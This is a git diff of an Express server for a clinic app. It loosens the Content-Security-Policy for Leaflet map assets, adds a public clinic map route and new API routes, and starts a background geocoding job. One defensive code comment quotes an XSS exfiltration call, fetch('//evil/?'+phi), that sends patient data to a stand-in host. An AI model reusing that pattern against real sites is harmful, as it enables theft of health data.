@@ -54,9 +54,17 @@ app.use(helmet({
         "'unsafe-inline'",
         "https://fonts.googleapis.com",
         "https://cdn.quilljs.com",
+        "https://unpkg.com", // Leaflet CSS para /mapa
       ],
       fontSrc: ["'self'", "data:", "https://fonts.gstatic.com"],
-      imgSrc: ["'self'", "data:", "blob:", "https://res.cloudinary.com"],
+      // tile.openstreetmap.org → tiles del mapa público /mapa.
+      // unpkg.com → markers PNG que Leaflet referencia desde su CSS.
+      imgSrc: [
+        "'self'", "data:", "blob:",
+        "https://res.cloudinary.com",
+        "https://*.tile.openstreetmap.org",
+        "https://unpkg.com",
+      ],
       // connect-src 'self' es la pieza clave: aunque un XSS sortee 'unsafe-inline',
       // no podrá exfiltrar datos via fetch('//evil/?'+phi) — el browser bloquea
       // cualquier destino que no sea el mismo origen.
@@ -124,6 +132,11 @@ app.get(/^\/confirmar\/[a-f0-9]{32}$/i, (req, res) => {
 // ante rutas raras.
 app.get(/^\/c\/[a-z0-9](?:[a-z0-9-]{1,38}[a-z0-9])?$/i, (req, res) => {
   serveHtmlWithVersion(path.join(PUBLIC_DIR, 'clinic-landing.html'), res);
+});
+
+// Mapa público de clínicas registradas. Sin auth: cualquiera puede entrar y ver pines.
+app.get('/mapa', (req, res) => {
+  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'mapa.html'), res);
 });
 
 // Intercept *.html requests before express.static so we can inject ?v=… into asset URLs
@@ -251,6 +264,8 @@ app.use('/api/reception', require('./routes/reception'));
 app.use('/api/inventory', require('./routes/inventory'));
 app.use('/api/inventory-usage', require('./routes/inventory-usage'));
 app.use('/api/audit', require('./routes/audit'));
+app.use('/api/growth', require('./routes/growth'));
+app.use('/api/integrations', require('./routes/integrations'));
 
 app.get('*', (req, res) => {
   serveHtmlWithVersion(path.join(PUBLIC_DIR, 'index.html'), res);
@@ -283,6 +298,13 @@ const PORT = process.env.PORT || 3000;
     };
     setTimeout(runPurge, 30 * 1000);                // primera corrida 30s después del arranque
     setInterval(runPurge, 24 * 60 * 60 * 1000);     // cada 24 horas
+
+    // Geocodifica al arranque las clínicas que aún no tienen lat/lng. Corre en
+    // background respetando el rate limit de Nominatim (1 req/s) y no bloquea listen.
+    setTimeout(() => {
+      require('./lib/geocoding').backfillMissing()
+        .catch(err => console.warn('[geocode-backfill]', err.message));
+    }, 5 * 1000);
 
     app.listen(PORT, () => {
       console.log(`\nSaludDigital running → http://localhost:${PORT}\n`);
